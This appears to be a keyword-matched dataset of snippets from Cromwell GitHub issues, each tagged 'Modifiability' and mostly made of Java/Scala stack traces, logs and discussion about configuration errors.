Modifiability,"t.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:260); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:248); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); 	at com.typesafe.config.impl.Parseable.parse(Parseable.java:299); 	at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:689); 	at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:51); 	at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:473); 	at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:259); 	at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:256); 	at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:65); 	at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:92); 	at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:256); 	at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:232); 	at cromwell.CromwellEntryPoint$.config$lzycompute(CromwellEntryPoint.scala:39); 	at cromwell.CromwellEntryPoint$.config(CromwellEntryPoint.scala:39); 	at cromwell.CromwellEntryPoint$.<init>(CromwellEntryPoint.scala:42); 	at cromwell.CromwellEntryPoint$.<clinit>(CromwellEntryPoint.scala); ```. In other words it tells me I'm missing a parenthesis `)`, but actually I was missin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:2984,config,config,2984,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['config'],['config']
Modifiability,t.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:39); at scala.util.Either.flatMap(Either.scala:352); at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:30); at womtool.input.WomGraphMaker$.fromFiles(WomGraphMaker.scala:46); at womtool.validate.Validate$.validate(Validate.scala:26); at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:54); at womto,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:2722,Config,ConfigFactory,2722,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigFactory']
Modifiability,"t; 	}; 	output {; 		File out = glob('*.txt')[0]; 	}; }; ```; This code does not work.; ```; $ java -jar ../cromwell-30.jar run test_conditionals_in_cromwell-30.wdl; Picked up _JAVA_OPTIONS: -Xms256M -Xmx1024M -XX:ParallelGCThreads=1; [2017-12-05 09:40:22,36] [info] Running with database db.url = jdbc:hsqldb:mem:ee347d5b-2cdf-4b76-b68a-dc5d09a93aeb;shutdown=false;hsqldb.tx=mvcc; [2017-12-05 09:40:28,42] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2017-12-05 09:40:28,44] [info] [RenameWorkflowOptionsInMetadata] 100%; [2017-12-05 09:40:28,54] [info] Running with database db.url = jdbc:hsqldb:mem:68a1b424-aa08-4f22-bc04-952c5eb83e7e;shutdown=false;hsqldb.tx=mvcc; [2017-12-05 09:40:29,02] [info] Slf4jLogger started; [2017-12-05 09:40:29,28] [info] Metadata summary refreshing every 2 seconds.; [2017-12-05 09:40:29,29] [info] Starting health monitor with the following checks: DockerHub, Engine Database; [2017-12-05 09:40:29,30] [info] WriteMetadataActor configured to write to the database with batch size 200 and flush rate 5 seconds.; [2017-12-05 09:40:29,35] [info] CallCacheWriteActor configured to write to the database with batch size 100 and flush rate 3 seconds.; [2017-12-05 09:40:30,63] [info] SingleWorkflowRunnerActor: Submitting workflow; [2017-12-05 09:40:30,68] [info] Workflow 6a6ee0eb-5576-43af-a64c-8ed7d288bbc5 submitted.; [2017-12-05 09:40:30,68] [info] SingleWorkflowRunnerActor: Workflow submitted 6a6ee0eb-5576-43af-a64c-8ed7d288bbc5; [2017-12-05 09:40:30,69] [info] 1 new workflows fetched; [2017-12-05 09:40:30,69] [info] WorkflowManagerActor Starting workflow 6a6ee0eb-5576-43af-a64c-8ed7d288bbc5; [2017-12-05 09:40:30,70] [info] WorkflowManagerActor Successfully started WorkflowActor-6a6ee0eb-5576-43af-a64c-8ed7d288bbc5; [2017-12-05 09:40:30,70] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2017-12-05 09:40:31,66] [error] WorkflowManagerActor Workflow 6a6ee0eb-5576-43a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2992:1472,config,configured,1472,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2992,1,['config'],['configured']
Modifiability,tContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	 at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:749); 	 at scala.util.Try$.apply(Try.scala:213); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:749); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:749); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1139); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1131); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	 at cromwell.core.retry.Retry$.withRetry(Retry.scala:46); 	 at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	 at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65); 	 at cromwell.backend.async.AsyncBackendJobExecutionActor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6757:7437,config,config,7437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757,1,['config'],['config']
Modifiability,"tDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner$(SharedFileSystemAsyncJobExecutionActor.scala:171); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecuti",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:2206,Config,ConfigAsyncJobExecutionActor,2206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"t` file lists the CI expectations of the workflow run, ex: `centaur/src/main/resources/standardTestCases/hello.test`. > the stderr files are totally empty, and then the one stdout (without extension) shows those two mapping files … Let me know if this looks correct? What you are looking for? Completely off base?. Based on the WDL you linked to, this output looks like what was expected :+1:. > Also - any reason to have all capitals vs. lowercase for the backend examples? (e.g. SLURM vs slurm). no reasoN. ---. On a related note I personally would love to see cromwell+singularity running under our CI, so that we could all a) point others at the working example and b) be sure the examples continue to work in the future. Most Broadies I know are even greener on Singularity than CircleCI, but I would be keen to learn sometime. Google turned up your earlier work on installing (parts-of?) [Singularity on a Travis VM](https://github.com/singularityhub/singularity-ci). That combined with these commented out configs could be a fantastic starting point to getting singularity+cromwell regularly tested together. For a similar example, with cromwell+TES, here is where that CI script installs and runs `funnel`:. https://github.com/broadinstitute/cromwell/blob/9f33e2a867fe20924e4f24e0cba8774f7d6d3132/src/ci/bin/testCentaurTes.sh#L14-L36. A similar script that installs the singularity binaries plus a small cluster(?) and then uses a working config file to run our Centaur test suite would be amazing for users. After it's all working, users are being pointed to docs under https://cromwell.readthedocs.io/, such as https://cromwell.readthedocs.io/en/stable/backends/TES/. A similar entry should be added for a working/tested singularity setup. [![Approved with PullApprove](https://img.shields.io/badge/two_reviewers-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/4039/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519:1663,config,configs,1663,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519,4,['config'],"['config', 'configs']"
Modifiability,"tack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; Default application.json not found in classpath in precompiled jar on github (affecting multiple releases tested version 86 and 85). ; Tested to not be affected version 79/56. Main error below. Should be an easy fix. . ```; Exception in thread ""main"" com.typesafe.config.ConfigException$IO: application: application.conf: java.io.IOException: resource not found on classpath: application.conf, application.json: java.io.IOException: resource not found on classpath: application.json, application.properties: java.io.IOException: resource not found on classpath: application.properties; at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:236); at com.typesafe.config.impl.ConfigImpl.parseResourcesAnySyntax(ConfigImpl.java:133); at com.typesafe.config.ConfigFactory.parseResourcesAnySyntax(ConfigFactory.java:1083); at com.typesafe.config.impl.SimpleIncluder.includeResourceWithoutFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:1202,Config,ConfigImpl,1202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigImpl']
Modifiability,tandardAsyncExecutionActor.scala:471); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:265); at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:264); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:141); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:140); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:124); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:121); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:599); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:599); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:599); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:208); at cromwell.back,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:2213,config,config,2213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,1,['config'],['config']
Modifiability,tandardAsyncExecutionActor.scala:511); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:319); at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:318); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(Standar,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5092:3599,config,config,3599,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5092,1,['config'],['config']
Modifiability,"tantiate Cromwell System. Shutting down Cromwell.; liquibase.exception.MigrationFailedException: Migration failed for change set changesets/failure_metadata.xml::causedByLists::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:""); WHERE METADATA_KEY LIKE ""%failures%causedBy:%""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809:1814,Enhance,EnhancedSqlDatabase,1814,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,"tart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1388,config,configuration,1388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['config'],['configuration']
Modifiability,tart-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.$anonfun$hash$3(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.$anonfun$tryWithResource$1(TryWithResource.scala:16); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.util.Try$.apply(Try.scala:209); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:52); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:73); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); Mar 09 00:55:25 web start-cromwell.sh[110916]: at akka.actor.Actor.aroundReceive(Actor.scala:514); Mar 09 00:55:25 web start-cromwell.sh[110916]: at akka.actor.Actor.aroundReceive$(Actor.scala:512); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.standard.callcaching.StandardFileHashingActor.aroundReceive(StandardFileHashingActor.scala:59); Mar 09 00:55:25 web start-cromwell.sh[110916]: at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); Mar 09 0,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3383:3070,config,config,3070,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3383,1,['config'],['config']
Modifiability,"tation:; [Call Caching](https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/) allows Cromwell to detect when a job has been run in the past so that it doesn't have to re-compute results, saving both time and money. The main purpose of the [Job Store table](https://cromwell.readthedocs.io/en/stable/developers/bitesize/workflowExecution/workflowSubworkflowAndJobStores/#job-store-job_store_entry) is to support resuming execution of a workflow when Cromwell is restarted by recovering the outputs of completed jobs. I couldn't find a description of the Execution Token nor of the [Value Store](https://cromwell.readthedocs.io/en/stable/developers/bitesize/workflowExecution/jobKeyValueStore/) in [the docs](https://cromwell.readthedocs.io/en/develop/developers/Arch). My questions are the following:. What is the engine waiting on when a task/job is ""Pending""?; Is Requesting an Execution Token something that happens for every task because of security reasons, or does it have to do with the allowed capacity for Cromwell? What types of token are we talking about?; What happens during Value Store, where are which values stored and why are we waiting on it rather than doing it?; is this, for example, collecting default environment variables that should be set before running the workflow; or; is it collecting the values of variables that are used in the workflow, provided with the `inputs.json`?; Does ""PreparingJob"" actually mean preparing the environment, or is it digesting all inputs for the task such that it can create the actual script to run/submit to the backend?; Is it possible to split RunningJob into more fragments than the time between submitting a task to the backend and the time it returns from the backend, or should everyone build a construct for their own backends themselves? (often one is interested in the time it takes a task to execute, rather than the sum of the time it takes for the backend to queue the task and the time it takes to execute it)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5579:2399,variab,variables,2399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5579,2,['variab'],['variables']
Modifiability,tents$(StandardAsyncExecutionActor.scala:316); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:644); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:644); 	at 